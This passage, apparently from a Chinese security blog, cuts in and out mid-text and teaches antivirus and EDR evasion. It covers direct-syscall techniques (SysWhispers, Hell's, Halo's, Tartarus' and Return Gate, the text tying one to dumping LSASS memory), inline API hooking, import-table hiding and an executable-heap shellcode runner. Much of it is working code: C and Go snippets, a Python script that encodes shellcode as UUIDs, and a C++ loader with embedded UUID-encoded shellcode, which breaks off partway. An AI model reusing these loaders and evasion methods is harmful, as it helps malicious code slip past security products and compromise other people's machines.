i++)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02x &quot;</span>, current[i]);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(egg, current, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found at %llu\n&quot;</span>, (ULONG64)currentAddress);<br>            WriteProcessMemory((HANDLE)((<span class="hljs-keyword">int</span>)<span class="hljs-number">-1</span>), currentAddress, replace, <span class="hljs-number">8</span>, &amp;nBytesRead);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ended search at:   0x%llu\n&quot;</span>, (ULONG64)startAddress + currentOffset);<br>    <span class="hljs-built_in">free</span>(current);<br>&#125;<br></code></pre></td></tr></table></figure><p>这样做虽然可以绕过静态的检测了但依旧存在问题，理论上syscall行为应该只存在ntdll中，而我们使用syscall是在当前程序中。简单的判断RIP就可以检测出我们的可疑行为<br><img src="https://s2.loli.net/2022/11/12/dfIEOSNrGlvC3Ko.png"><br>而对与RIP的检测，作者也给出了技术方案，还是比较简单的。在内存中搜索syscall的地址，直接jmp到该位置。即可让RIP指向ntdll<br><code>python3 syswhispers.py -p common -a x64 -c msvc -m jumper -v -d -o 1</code></p><h2 id="机器学习特征的edr的检测"><a href="#机器学习特征的edr的检测" class="headerlink" title="机器学习特征的edr的检测"></a>机器学习特征的edr的检测</h2><p><a href="https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection">https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection</a></p><h3 id="windows-api-hook"><a href="#windows-api-hook" class="headerlink" title="windows api hook"></a>windows api hook</h3><ol><li>找到内存中需要被hook的函数地址<code>LPVOID  lpDllExport = GetProcAddress(hJmpMod, jmpFuncName);</code></li><li>找到后将前七个字节改为跳转，如下<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> jmpSc[<span class="hljs-number">7</span>]&#123;<br>        <span class="hljs-number">0xB8</span>, b[<span class="hljs-number">0</span>], b[<span class="hljs-number">1</span>], b[<span class="hljs-number">2</span>], b[<span class="hljs-number">3</span>],<br>        <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE0</span><br>    &#125;;<br>``` <br><span class="hljs-number">3.</span> 机器码对应的汇编指令大概是<br>```arm<br>move eax,xxxx<br>jmp eax<br></code></pre></td></tr></table></figure></li><li>修改内存<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">WriteProcessMemory(<br>        hProc,<br>        lpDllExport,<br>        jmpSc,<br>        <span class="hljs-keyword">sizeof</span>(jmpSc),<br>        &amp;szWritten<br>    );<br></code></pre></td></tr></table></figure>实现了劫持对应函执行流程的功能。如果想要维持函数原本的功能，保存原本的七个字节，在shellcode中再次替换这部分内存并jump回来</li></ol><h3 id="Windows-内存分配的一些规则"><a href="#Windows-内存分配的一些规则" class="headerlink" title="Windows 内存分配的一些规则"></a>Windows 内存分配的一些规则</h3><p>在windows 10 64位下，内存最小的分配粒度为4kB, systeminfo结构体中，标识了这个变量，为内存分页的大小。<br>在windows中，所有VirtualAllocEx分配的内存，会向上取整到AllocationGranularity的值，windows10下为64kb，比如：</p><p>我们在0x40000000的基址分配了4kB的MEM_COMMIT | MEM_RESERVE的内存，那么整块0x40010000 (64kB)区域将不能被重新分配。</p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>很多edr将创建远程线程的行为列为可疑行为，比如windows definder仅仅是做记录但并不报警，产生报警还有其他的判断逻辑</p><ol><li>与其分配一大块内存并直接将~250KB的implant shellcode写入该内存，不如分配小块但连续的内存，例如&lt;64KB的内存，并将其标记为NO_ACCESS。然后，将shellcode按照相应的块大小写入这些内存页中。</li><li>在上述的每一个操作之间引入延迟。这将增加执行shellcode所需的时间，但也会淡化连续执行模式。</li><li>使用钩子，劫持RtlpWow64CtxFromAmd64函数，执行恶意shellcode</li></ol><hr><p>参考文章<br><a href="https://xz.aliyun.com/t/11496">https://xz.aliyun.com/t/11496</a><br><a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/">https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/</a><br><a href="https://blog.redbluepurple.io/windows-security-research/bypassing-injection-detection">https://blog.redbluepurple.io/windows-security-research/bypassing-injection-detection</a></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hell&#39;s Gate</title>
      <link href="2022/11/09/Hell&#39;s%20Gate/"/>
      <url>2022/11/09/Hell&#39;s%20Gate/</url>
      
        <content type="html"><![CDATA[<h1 id="Hell’s-Gate"><a href="#Hell’s-Gate" class="headerlink" title="Hell’s Gate"></a>Hell’s Gate</h1><h2 id="地狱之门"><a href="#地狱之门" class="headerlink" title="地狱之门"></a>地狱之门</h2><p><a href="https://github.com/am0nsec/HellsGate">地狱之门</a>的主要实现是直接系统调用来绕过用户级API的hook，这种技术可用于使用 Cobalt Strike 创建 LSASS 内存转储，同时不接触磁盘并规避 AV/EDR 监控的用户模式的API调用。</p><a id="more"></a><h3 id="直接系统调用"><a href="#直接系统调用" class="headerlink" title="直接系统调用"></a>直接系统调用</h3><p>对于windows而言，你可能经历过，一个简单的应用程序崩溃，导致整个系统崩溃，什么出现无法理解的蓝屏情况，而使用windbg也无法找出其存在问题，这是因为操作系统在一个real模式下运行，这意味着处理器在没有应用层次你隔离和保护的模式下运行。由于严重的系统内存损坏，错误的程序或者错误可能导致操作系统完全崩溃，因为对于可以访问或不访问的内存区域没有限制。<br>而保护模式的更新处理器和操作系统引入了许多保护措施，并且可以并且可以通过使用虚拟内存和特权级别或环将正在运行的程序相互隔离来保护系统免受崩溃。在 Windows 系统中，实际使用了其中两个环。应用程序在 用户模式下运行，相当于 ring 3，关键系统组件如内核和设备驱动程序在 内核模式下运行，对应于 ring 0。<br><img src="https://s2.loli.net/2022/11/09/Pe8JtUjiFf6uQXb.png"></p><p>使用这些保护环可以确保应用程序是隔离的，并且不能直接访问在 内核模式下运行的关键内存部分和系统资源。当应用程序需要执行特权系统操作时，处理器首先需要切换到 ring 0 以将执行流程切换到 kernel-mode。这是 系统调用到位的地方。</p><p>例如我们将文件保存在磁盘上的这个操作，操作系统需要访问文件系统和设备驱动程序。这些是特权操作，不应允许应用程序本身执行。直接从应用程序访问设备驱动程序可能会导致非常糟糕的事情。因此，进入内核模式之前的最后一个 API 调用负责将 dip 开关拉入内核区域。</p><p>因此许多AV的hook都会放在这里，这样他们就可以绕过执行流程，直接进入引擎，来监控可疑行为并拦截API调用<br>所以我们需要做的就是直接执行系统调用来绕过Windows和Native API，这样就能绕过用户模式的hook</p><h3 id="地狱之门的实现"><a href="#地狱之门的实现" class="headerlink" title="地狱之门的实现"></a>地狱之门的实现</h3><p>“地狱之门”是@am0nsec 和@RtlMateusz 在本文中创造的一个术语：<br><a href="https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf">Hell’s Gate</a><br>其基本概念是通过读取 ntdll.dll 在主机上动态找到系统调用，然后从您自己的自定义实现中调用它们。<br>将现有代码转换为系统调用时，我们需要做的第一件事是弄清楚底层系统调用是什么</p><p>我们需要找到系统调用操作码并将我们的自定义函数指向它们</p><ol><li>首先，我们的函数被分配给一个数组，我们将用从 ntdll 复制的操作码填充该数组。<br><img src="https://s2.loli.net/2022/11/09/YwdaC6h42eKxGkB.png"><br><img src="https://s2.loli.net/2022/11/09/PVpS9MEzX4QaDbq.png"></li><li>调用新的自定义函数，就如同我们在调用普通函数一样<br>例如这个新实现的<code>NtOpenProcess</code>函数，这比原来的OpenProcess复杂得多，这样就能规避掉常见的API用户态hook<br><img src="https://s2.loli.net/2022/11/09/kXe5WZftBsoMP1D.png" alt="NtOpenProcess"></li></ol><h1 id="Halo’s-Gate"><a href="#Halo’s-Gate" class="headerlink" title="Halo’s Gate"></a>Halo’s Gate</h1><h2 id="光环之门"><a href="#光环之门" class="headerlink" title="光环之门"></a>光环之门</h2><p>对于Hell’s Gate而言,最初是一种非常有创意的方法，通过从PEB结构中解析 InMemoryOrderModuleLIst 来获取系统调用编号。通过找到 ntdll.dll 地址（通常是 InMemoryOrderModuleLIst 中的第一个条目），可以通过解析其导出以获取我们需要的必要函数的系统调用编号。</p><p>而Halo’s Gate是一种基于Hell’s Gate的新技术，用于解开WINAPI调用<br>Halo’s Gate 基本上检查被调用的 WINAPI 的第一个字节，如果它们应该是“4c8bd1b8”，那么 WINAPI 没有被钩住，一切正常进行，但是当第一个字节是“e9”时，jmp 汇编指令重定向程序执行到 AV/EDR 检查引擎，因此它被hook了<br><img src="https://s2.loli.net/2022/11/09/LpQ2uSaWA4mIzvs.png"><br>如果字节是“e9”，Halo’s Gate 解决了这个问题，通过向上或向下检查下一个或上一个系统调用的系统调用，如果它没有被hook，那么我们抓住系统调用并添加 +1 字节，因为它们都是有序的。</p><h1 id="Tartarus’-Gate"><a href="#Tartarus’-Gate" class="headerlink" title="Tartarus’ Gate"></a>Tartarus’ Gate</h1><h2 id="光环之门的进化"><a href="#光环之门的进化" class="headerlink" title="光环之门的进化"></a>光环之门的进化</h2><p>Halo’s Gate并也不是万能的，因为并不是所有EDR都以相同的方式连接，所有我们必须绕过，并将其优化，在EDR中，很显然，它以字节“4c8bd1e9”开头<br><img src="https://s2.loli.net/2022/11/09/oMpuabB7XqtCFDI.png" alt="当WINAPI调用被挂起时"><br>所以我们需要增加一个检查，检查第四个字节是否是<code>e9</code>，如果是，那么它将按照Halo’s Gate解开来绕过EDR<br><a href="https://github.com/trickster0/TartarusGate">项目地址</a></p><h1 id="Return-Gate"><a href="#Return-Gate" class="headerlink" title="Return Gate"></a>Return Gate</h1><h2 id="返程门"><a href="#返程门" class="headerlink" title="返程门"></a>返程门</h2><p>地狱之门带你下地狱，返程之门带sysid回家</p><p>对于绝大多数的直接系统调用的项目而言，其核心操作可以分为两部分</p><ol><li>绕过EDR监控获取sysid</li><li>使用sysid绕过EDR监控调用nt api</li></ol><p>对于NT API的调用</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r10</span>,<span class="hljs-built_in">rcx</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>,xxh<br><span class="hljs-keyword">syscall</span><br><span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>因为当其在传入 eax 寄存器的值不同，存储的是系统调用号，即sysid，不同调用号针对syscall 进入内核调用的不同的内核函数。<br>而对于r3层的edr hook来说，会在api地址的前段加入inline hook<br>这样在进行API调用的时候就会强制跳转到一个地址，即为EDR的探针。<br>而这里有一个很好的项目，包括参数欺骗和系统调用检索。他们都滥用EH来破坏EDR<br><a href="https://github.com/rad9800/TamperingSyscalls">TamperingSyscalls</a></p><h2 id="Return-Gate实现"><a href="#Return-Gate实现" class="headerlink" title="Return Gate实现"></a>Return Gate实现</h2><p>我们已经知道了</p><ol><li>EDR hook大部分不会影响到syscall;ret指令。</li><li>在执行syscall指令时sysid位于eax寄存器中。</li><li>使用空参数调用api被记录到的恶意程度较低。</li><li>部分EDR会监控自己的钩子是否被脱钩。<br>所以ret 指令会将eax寄存器的值返回。</li></ol><p>那么，就有了一个获取sysid的新手段，使用writeprocessmemory将Nt API的syscall指令修改为nop，再使用空参数调用api, 返回值即为该api的sysid，项目用Go实现了一段POC<br><a href="https://github.com/timwhitez/ReturnGate">项目地址</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Go">replace:= []<span class="hljs-keyword">byte</span>&#123;<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>&#125;<br>raw:= []<span class="hljs-keyword">byte</span>&#123;<span class="hljs-number">0x0f</span>,<span class="hljs-number">0x05</span>&#125;<br><br><span class="hljs-comment">//获取地址</span><br>apiName := <span class="hljs-string">&quot;NtReadVirtualMemory&quot;</span><br>nt := syscall.NewLazyDLL(<span class="hljs-string">&quot;ntdll&quot;</span>).NewProc(apiName).Addr()<br><br><span class="hljs-comment">//替换</span><br><span class="hljs-keyword">if</span> *(*<span class="hljs-keyword">byte</span>)(unsafe.Pointer(nt+<span class="hljs-number">18</span>)) == <span class="hljs-number">0x0f</span> &amp;&amp;<br>*(*<span class="hljs-keyword">byte</span>)(unsafe.Pointer(nt+<span class="hljs-number">19</span>)) == <span class="hljs-number">0x05</span> &amp;&amp;<br>*(*<span class="hljs-keyword">byte</span>)(unsafe.Pointer(nt+<span class="hljs-number">20</span>)) == <span class="hljs-number">0xc3</span>&#123;<br>windows.WriteProcessMemory(<span class="hljs-number">0xffffffffffffffff</span>,nt+<span class="hljs-number">18</span>,(*<span class="hljs-keyword">byte</span>)(unsafe.Pointer(&amp;replace[<span class="hljs-number">0</span>])),<span class="hljs-number">2</span>,<span class="hljs-literal">nil</span>)<br>&#125;<br><br><span class="hljs-comment">//空调用获取sysid</span><br>sysid,_,_ := syscall.Syscall(nt,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>fmt.Printf(<span class="hljs-string">&quot;sysid: %d\n\n&quot;</span>,sysid)<br><br><span class="hljs-comment">//恢复</span><br>windows.WriteProcessMemory(<span class="hljs-number">0xffffffffffffffff</span>,nt+<span class="hljs-number">18</span>,(*<span class="hljs-keyword">byte</span>)(unsafe.Pointer(&amp;raw[<span class="hljs-number">0</span>])),<span class="hljs-number">2</span>,<span class="hljs-literal">nil</span>)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态恶意代码逃逸3</title>
      <link href="2022/10/20/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B83/"/>
      <url>2022/10/20/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B83/</url>
      
        <content type="html"><![CDATA[<h1 id="静态恶意代码逃逸3"><a href="#静态恶意代码逃逸3" class="headerlink" title="静态恶意代码逃逸3"></a>静态恶意代码逃逸3</h1><p>最近在学习从底层用C/C++去实现免杀，而看到了关于静态恶意代码逃逸的一些很好的文章，在此记录总结一下</p><a id="more"></a><h3 id="调用自己函数隐藏导入表"><a href="#调用自己函数隐藏导入表" class="headerlink" title="调用自己函数隐藏导入表"></a>调用自己函数隐藏导入表</h3><h4 id="Import-Address-Table（IAT）"><a href="#Import-Address-Table（IAT）" class="headerlink" title="Import Address Table（IAT）"></a>Import Address Table（IAT）</h4><p>在上一篇文章中，我们对于PE文件的结构有了一定的了解<br>而PE文件的导入表(IAT)将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)<br>见而言之就是PE利用导入表来找外部函数地址</p><p>这里没找到原文中的工具，于是自己找了一个工具,用来查看程序中的导入表<br><a href="https://github.com/oxiKKK/iat-dump">IAT-dump</a></p><p>对于这个工具，也可能是自己没怎么接触过C++20，于是折腾了挺久才跑起来</p><p>根据main.cpp中的这一段代码可以知道，需要我们传一点参数进去<br><img src="https://s2.loli.net/2022/10/20/RMhZQGt4ijUYedr.png" alt="main.cpp"></p><p>而对于main函数中传递参数<code>int main(int argc, char** argv)</code><br>其中argc记录的是参数的个数，argv则是按顺序存储了传入的参数</p><p>那我们第一步先将调试模式改成release，这样编译后会存在一个iat-dump.exe<br><code> .\iat-dump.exe -file evil.exe</code><br>这样即可查看evil.exe的导入表（evil.exe得在当前目录下）<br><img src="https://s2.loli.net/2022/10/20/GxKI6VnmOcD9WAL.png"></p><p><em>在找工具的时候，也发现了一个比较好玩的东西，不过还没仔细去看，先记录一下 <a href="https://github.com/fdgnneig/ShellProgram">https://github.com/fdgnneig/ShellProgram</a></em></p><h4 id="获取函数地址"><a href="#获取函数地址" class="headerlink" title="获取函数地址"></a>获取函数地址</h4><p>这个API在Kernel32.dll中有一个函数<code>GetProcAddress</code>被导出，主要功能是从一个加载的模块中获取函数的地址<br>其能返回一个我们需要找的函数的地址，我们就需要利用这个函数，来自己手动获取函数地址，这样就不会使危险的函数出现在IAT中<br>因为杀软会对导入表中的某些函数（例如VirtualAlloc函数基于可执行权限时，会直接报毒查杀）特别关注</p><p>我们定义一些函数指针来存放函数的地址<br><code>ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(&quot;kernel32.dll&quot;)), &quot;VirtualAlloc&quot;);</code></p><p>编译通过后，自定义的函数时不会出现在导入表中的，这样就减少了文件特征</p><h3 id="重载运算符"><a href="#重载运算符" class="headerlink" title="重载运算符"></a>重载运算符</h3><p>一般情况下，C/C++程序中的字符串常量会被硬编码到程序中（.data段，也就是数据段），尤其是全局变量最容易被定位到<br>于是想到使用重载运算符来将string重载，再进行编码等一系列操作<br>这里有个项目已经实现了，重载运算符的原理比较容易理解，就不做多叙述了<br><a href="https://github.com/Rvn0xsy/Cooolis-ms">https://github.com/Rvn0xsy/Cooolis-ms</a></p><h3 id="绕过DEP"><a href="#绕过DEP" class="headerlink" title="绕过DEP"></a>绕过DEP</h3><h4 id="什么是DEP"><a href="#什么是DEP" class="headerlink" title="什么是DEP"></a>什么是DEP</h4><p>在Windows Xp SP2 之前的时代，缓冲区溢出漏洞利用门槛太低了，只要发现有缓冲区溢出漏洞，就可以直接稳定利用，攻击者只需要将Shellcode不断写入堆栈，然后覆盖函数返回地址，代码就可以在堆栈中执行。但堆栈的用途主要是保存寄存器现场，提供一个函数运行时的存储空间，极少数需要代码在堆栈中执行，于是微软为了缓解类似的情况，发明了DEP保护机制，用于限制某些内存页不具有可执行权限</p><h4 id="绕过DEP-1"><a href="#绕过DEP-1" class="headerlink" title="绕过DEP"></a>绕过DEP</h4><p>VirtualProtect这个API能够更改内存页的属性为可执行或不可执行，对于二进制漏洞利用来说，溢出的时候，把返回地址设计为VirtualProtect的地址，再精心构造一个栈为调用这个API的栈，就可以改变当前栈的内存页的属性，使其从”不可执行”变成”可执行”<br>由此说来，Shellcode执行其实也需要一个可执行的内存页，<br>于是我们找到了一个API  HeapCreate可以在进程中创建辅助堆栈，并且能够设置堆栈的属性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HANDLE WINAPI <span class="hljs-title">HeapCreate</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">__in DWORD flOptions,</span></span><br><span class="hljs-function"><span class="hljs-params">__in SIZE_T dwInitialSize,</span></span><br><span class="hljs-function"><span class="hljs-params">__in SIZE_T dwMaximumSize )</span></span>;<br></code></pre></td></tr></table></figure><p>对于第一个参数</p><ol><li>HEAP_NO_SERIALIZE：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用</li><li>HEAP_GENERATE_EXCEPTIONS：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL</li><li>HEAP_CREATE_ENALBE_EXECUTE：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据<br>我们的思路就是将shellcode存入到这个辅助进程中<br>直接贴上示例代码<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> shellcode[] = <span class="hljs-string">&quot;123&quot;</span>;<br><br>HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>PVOID Mptr = HeapAlloc(hHep, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>RtlCopyMemory(Mptr, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>DWORD dwThreadId = <span class="hljs-number">0</span>;<br>HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)Mptr, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;dwThreadId);<br>WaitForSingleObject(hThread, INFINITE);<br><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Hello World!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="Bin2UUID"><a href="#Bin2UUID" class="headerlink" title="Bin2UUID"></a>Bin2UUID</h3><p>这是通过唯一标识符（universally unique identifier, UUID）来存储shellcode，并使用CALL BACK函数的特性来加载Shellcode<br>这里直接贴上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> UUID<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Usage: python3 binToUUIDs.py shellcode.bin [--print]</span><br><br>print(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">  ____  _    _______    _    _ _    _ _____ _____       </span><br><span class="hljs-string"> |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      </span><br><span class="hljs-string"> | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  </span><br><span class="hljs-string"> |  _ &lt;| | &#x27;_ \| |/ _ \| |  | | |  | | | | | |  | / __| </span><br><span class="hljs-string"> | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ </span><br><span class="hljs-string"> |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/</span><br><span class="hljs-string">\n&quot;&quot;&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">bin</span> = f.read()<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">2</span>] == <span class="hljs-string">&quot;--print&quot;</span>:<br>    outputMapping = <span class="hljs-literal">True</span><br><span class="hljs-keyword">else</span>:<br>    outputMapping = <span class="hljs-literal">False</span><br><br>offset = <span class="hljs-number">0</span><br><br>print(<span class="hljs-string">&quot;Length of shellcode: &#123;&#125; bytes\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>)))<br><br>out = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">while</span>(offset &lt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>)):<br>    countOfBytesToConvert = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>[offset:])<br>    <span class="hljs-keyword">if</span> countOfBytesToConvert &lt; <span class="hljs-number">16</span>:<br>        ZerosToAdd = <span class="hljs-number">16</span> - countOfBytesToConvert<br>        byteString = <span class="hljs-built_in">bin</span>[offset:] + (<span class="hljs-string">b&#x27;\x00&#x27;</span>* ZerosToAdd)<br>        uuid = UUID(bytes_le=byteString)<br>    <span class="hljs-keyword">else</span>:<br>        byteString = <span class="hljs-built_in">bin</span>[offset:offset+<span class="hljs-number">16</span>]<br>        uuid = UUID(bytes_le=byteString)<br>    offset+=<span class="hljs-number">16</span><br><br>    out += <span class="hljs-string">&quot;\&quot;&#123;&#125;\&quot;,\n&quot;</span>.<span class="hljs-built_in">format</span>(uuid)<br>    <br>    <span class="hljs-keyword">if</span> outputMapping:<br>        print(<span class="hljs-string">&quot;&#123;&#125; -&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(byteString, uuid))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;UUIDs&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(out)<br><br>print(<span class="hljs-string">&quot;Outputted to: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;UUIDs&quot;</span>))<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;rpc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;Rpcrt4.lib&quot;</span>)</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * buf[] = &#123;<br><span class="hljs-string">&quot;4baf01bd-dbdd-d9de-7424-f45a33c9b131&quot;</span>,<br><span class="hljs-string">&quot;83136a31-04c2-6a03-0e4d-be21f81341da&quot;</span>,<br><span 